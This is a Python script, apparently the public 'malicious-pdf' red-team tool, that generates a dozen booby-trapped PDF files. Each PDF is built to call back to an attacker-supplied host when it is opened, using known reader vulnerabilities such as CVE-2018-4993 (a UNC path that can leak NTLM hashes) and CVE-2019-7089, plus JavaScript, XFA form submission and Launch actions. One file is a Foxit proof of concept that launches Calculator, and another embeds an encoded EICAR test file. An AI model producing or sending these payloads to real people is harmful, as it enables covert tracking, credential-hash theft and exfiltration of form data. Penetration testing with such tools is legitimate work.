#!/usr/bin/python
# -*- coding: UTF-8 -*-
##
## Create different types of malicious PDF files. Used for penetration testing and/or red-teaming etc
##
## Usage ./malicious-pdf.py burp-collaborator-url
##
## Output will be written as: test1.pdf, test2.pdf, test3.pdf and test4.pdf
##
## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
##
## Jonas Lejon, 2022 <jonas.github@triop.se> 
## https://github.com/jonaslejon/malicious-pdf

import sys
if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

import io
import bz2
import base64

# Eicar test file embedded in PDF. Source: https://github.com/fire1ce/eicar-standard-antivirus-test-files
# Created by Stas Yakobov
def create_malpdf11(filename):
    eicar = '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'
    with open(filename, "wb") as file:
        file.write(bz2.decompress(base64.b64decode(eicar)))

# Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
# Source: https://twitter.com/l33d0hyun/status/1448342241647366152 
# This sample contains no phone-home
def create_malpdf10(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (
this.getURL("file:///System/Applications/Calculator.app")
)>> trailer <</Root 1 0 R>>''')

## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf9(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'data'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /ImportData
     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000164 00000 n
0000000265 00000 n
0000000724 00000 n
0000000844 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
997
%%EOF
''')

## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf8(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'form'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
     /Flags 4 % SubmitHTML
   % /Flags 32 % SubmitXFDF
   % /Flags 256 % SubmitPDF
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
908
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf7(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'gotor'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /GoToR
     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
     /NewWindow false
     /D [0 /Fit]
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
937
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf6(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
922
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf5(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /URI
     /URI (''' + host + '''/test5)
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
854
%%EOF
''')

#a pdf file where javascript code is evaluated for execution
# % BSD Licence, Ange Albertini, 2011
def create_malpdf3(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>''')

def create_malpdf2(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# Adobe Reader - PDF callback via XSLT stylesheet in XFA
# CVE-2019-7089
# From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
def create_malpdf4(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-

1 0 obj <<>>
stream
<?xml version="1.0" ?>
<?xml-stylesheet href="\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
endstream
endobj
trailer <<
    /Root <<

        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
''')


# This is CVE-2018-4993
# From https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
def create_malpdf(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (''' + host + ''')
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


if __name__ == "__main__":

  try:
    host = sys.argv[1]
  except IndexError as e:
      print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
      sys.exit(1)

  print("Creating PDF files..")

  create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' )
  create_malpdf("test1bis.pdf", 'https://' + host)
  create_malpdf2("test2.pdf", 'https://' + host)
  create_malpdf3("test3.pdf", 'https://' + host)
  create_malpdf4("test4.pdf", 'https://' + host)
  create_malpdf5("test5.pdf", 'https://' + host)
  create_malpdf6("test6.pdf", 'https://' + host)
  create_malpdf7("test7.pdf", 'https://' + host)
  create_malpdf8("test8.pdf", 'https://' + host)
  create_malpdf9("test9.pdf", 'https://' + host)
  create_malpdf10("test10.pdf")
  create_malpdf11("test11.pdf")

  print("Done.")
